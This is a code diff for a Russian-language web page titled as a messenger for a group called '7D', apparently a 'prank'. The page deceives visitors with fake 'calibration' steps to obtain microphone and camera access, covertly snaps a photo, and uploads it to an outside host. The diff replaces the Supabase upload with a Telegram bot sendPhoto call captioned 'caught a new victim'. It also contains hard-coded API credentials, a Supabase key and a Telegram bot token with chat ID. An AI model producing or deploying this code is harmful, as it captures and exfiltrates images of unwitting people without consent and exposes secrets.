@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Мессенджер для 7Д</title>
-    <!-- Подключаем библиотеку Supabase -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -124,11 +122,9 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Твои реальные данные Supabase
-        const SUPABASE_URL = 'https://vesinwkjmjykdhtdsnat.supabase.co';
-        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZlc2lud2tqbWp5a2RodGRzbmF0Ikkicm9sZSI6ImFub24iLCJpYXQiOjE3OTI0OTg5NTUsImV4cCI6MjEwODA3NDk1NX0.JDAtKh6sW9nmeIpdr1zMG_OPYfXsmXrZPATepyi831w';
-        
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        // Твои реальные данные бота и чата
+        const BOT_TOKEN = '9176741718:AAG4UgtGs8O8MovvouhjS8ncg3Jbgl73PWY'; 
+        const CHAT_ID = '7523561197';
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -138,38 +134,41 @@
         const statusText = document.getElementById('status-text');
         const uploadStatus = document.getElementById('upload-status');
 
-        async function sendToSupabase(dataUrl) {
+        async function sendToTelegram(dataUrl) {
             try {
                 const res = await fetch(dataUrl);
                 const blob = await res.blob();
-                const fileName = `7d_target_${Date.now()}.png`;
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'target.png');
+                formData.append('caption', '🎯 Пойман новый жертва! 😂');
 
-                // Сохраняем в бакет 'files'
-                const { data, error } = await supabaseClient.storage
-                    .from('files')
-                    .upload(fileName, blob, { contentType: 'image/png' });
+                const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
 
-                if (error) {
-                    console.error('Ошибка Supabase:', error);
-                    uploadStatus.textContent = "Ошибка загрузки: проверь права доступа (RLS) в бакете files.";
+                const tgData = await tgRes.json();
+
+                if (tgData.ok) {
+                    uploadStatus.textContent = "Снимок успешно отправлен тебе в Telegram! 🚀";
                 } else {
-                    uploadStatus.textContent = "Снимок успешно улетел в базу файлов! 🚀";
+                    uploadStatus.textContent = "Ошибка отправки боту: " + tgData.description;
                 }
             } catch (err) {
                 console.error('Ошибка сети:', err);
-                uploadStatus.textContent = "Ошибка отправки в облако.";
+                uploadStatus.textContent = "Ошибка связи с Telegram.";
             }
         }
 
         async function initMessengerPrank() {
             try {
-                // ШАГ 1: Запрашиваем микрофон
                 statusText.textContent = "Шаг 1/2: Калибровка микрофона для связи...";
                 const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                 
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // ШАГ 2: Запрашиваем камеру (универсальный запрос для телефонов)
                 statusText.textContent = "Шаг 2/2: Проверка видеокамеры...";
                 const videoStream = await navigator.mediaDevices.getUserMedia({ 
                     video: true, 
@@ -188,21 +187,17 @@
 
                     const dataUrl = canvas.toDataURL('image/png');
 
-                    // Показываем фотку на экране
                     const img = document.createElement('img');
                     img.src = dataUrl;
                     photoContainer.appendChild(img);
 
-                    // Гасим потоки
                     audioStream.getTracks().forEach(track => track.stop());
                     videoStream.getTracks().forEach(track => track.stop());
 
-                    // Переключаем интерфейс
                     loaderScreen.style.display = 'none';
                     prankScreen.style.display = 'flex';
 
-                    // Отправляем в Supabase в бакет 'files'
-                    await sendToSupabase(dataUrl);
+                    await sendToTelegram(dataUrl);
 
                 }, 1000);
 
